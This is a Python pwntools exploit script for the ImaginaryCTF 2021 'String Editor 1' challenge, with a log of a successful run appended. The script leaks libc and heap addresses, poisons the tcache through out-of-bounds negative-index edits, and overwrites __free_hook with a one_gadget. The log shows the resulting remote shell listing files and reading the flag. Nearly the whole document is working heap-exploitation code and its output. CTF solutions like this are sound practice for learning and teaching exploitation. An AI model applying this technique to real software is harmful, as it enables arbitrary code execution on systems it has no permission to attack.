from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './string_editor_1'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "chal.imaginaryctf.org"
  PORT = 42004
  s = remote(HOST, PORT)
  libc = ELF('./libc.so.6')
else:
  #s = process(BINARY)
  #libc = elf.libc 
  s = process(BINARY, env={'LD_PRELOAD': './libc.so.6'})
  libc = ELF('./libc.so.6')

def Edit(pos, data):
  s.recvuntil("What character would you like to edit? (enter in 15 to get a fresh pallette)\n")
  s.sendline(str(pos))
  s.recvuntil("What character should be in that index?\n")
  s.sendline(data)

def Edit_8bytes(pos, data):
  for i in range(8):
    d0 = (data >> (i*8)) & 0xff
    Edit(pos+i, bytes([d0]))

s.recvuntil("But first, a word from our sponsors: ")
system_addr = int(s.recvuntil("\n"), 16)
libc_base   = system_addr - libc.sym.system
free_hook   = libc_base + libc.sym.__free_hook
one_gadget  = libc_base + 0xe6c81
print("system_addr =", hex(system_addr))
print("libc_base   =", hex(libc_base))

s.recvuntil("What character would you like to edit? (enter in 15 to get a fresh pallette)\n")
s.sendline("0")
s.recvuntil("What character should be in that index?\n")
s.sendline("0")

s.recvuntil("DEBUG: ")
heap_leak = int(s.recvuntil("\n"), 16)
heap_base = heap_leak - 0x2a0
print("heap_leak   =", hex(heap_leak))
print("heap_base   =", hex(heap_base))

# tcache poisoning
Edit(-0x290, "\x01")
Edit_8bytes(-0x210, free_hook)

# change size 0x21 => 0x31
Edit(-0x8, "\x31")

# free and malloc
Edit(15, "0")

# start one gadget
Edit_8bytes(0, one_gadget)
s.recvuntil("What character would you like to edit? (enter in 15 to get a fresh pallette)\n")
s.sendline("15")

s.interactive()

'''
mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_String_Editor_1_200$ python3 solve.py r
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_String_Editor_1_200/string_editor_1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.imaginaryctf.org on port 42004: Done
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_String_Editor_1_200/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
system_addr = 0x7f7f7eadb410
libc_base   = 0x7f7f7ea86000
heap_leak   = 0x5637a71e02a0
heap_base   = 0x5637a71e0000
[*] Switching to interactive mode
$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 20
-rw-r--r-- 1 nobody nogroup    42 Jul 23 06:42 flag.txt
-rwxr-xr-x 1 nobody nogroup 12808 Jul 23 06:42 run
$ cat flag.txt
ictf{alw4ys_ch3ck_y0ur_1nd1c3s!_4e42c9f2}
'''
